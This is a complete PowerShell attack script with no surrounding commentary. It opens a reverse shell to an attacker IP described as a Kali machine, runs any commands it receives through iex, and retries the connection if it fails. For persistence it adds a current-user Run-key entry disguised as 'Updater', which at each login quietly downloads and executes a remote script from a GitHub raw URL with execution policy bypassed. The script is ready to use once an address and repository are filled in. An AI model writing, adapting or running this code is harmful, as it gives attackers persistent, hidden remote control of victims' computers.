# === CONFIGURATION ===
$attackerIP = "192.168.137.107"  # Replace with your Kali IP
$attackerPort = 4444             # Make sure your listener is running!

# === REVERSE SHELL FUNCTION ===
function Start-ReverseShell {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($attackerIP, $attackerPort)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % { 0 }
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 10
        Start-ReverseShell
    }
}

# === ADD TO CURRENT USER'S STARTUP (NO ADMIN NEEDED) ===
$payload = 'powershell -w hidden -ep bypass -c "iex(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/yourusername/yourrepo/main/user_persistent_shell.ps1\')"'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $payload

# === LAUNCH IMMEDIATELY ===
Start-ReverseShell
